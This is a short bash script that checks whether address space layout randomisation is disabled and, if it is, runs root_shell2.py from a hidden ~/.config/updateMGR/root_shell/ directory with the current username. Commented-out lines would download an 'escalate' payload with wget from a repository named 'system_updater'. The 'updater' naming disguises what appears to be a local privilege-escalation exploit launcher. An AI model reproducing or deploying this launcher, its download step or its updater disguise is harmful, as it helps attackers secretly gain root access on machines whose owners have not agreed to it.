#!/bin/bash
status=`cat /proc/sys/kernel/randomize_va_space`
if [[ $status -eq "0" ]];
then
    # echo $status>status_file
    # download_loc=/home/"$(whoami)"/.config/updateMGR/root_shell/
    # wget -q https://raw.githubusercontent.com/nitin-kumar-iiith/system_updater/main/escalate -P $download_loc
    username=$(whoami)
    /home/"$(whoami)"/.config/updateMGR/root_shell/root_shell2.py $username
fi